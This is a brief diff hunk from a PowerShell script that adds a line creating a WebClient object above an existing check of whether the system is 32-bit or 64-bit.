@@ -1,3 +1,5 @@
+$wc = New-Object System.Net.WebClient
+
 #Check OS
 if ([System.IntPtr]::Size -eq 4)
 {
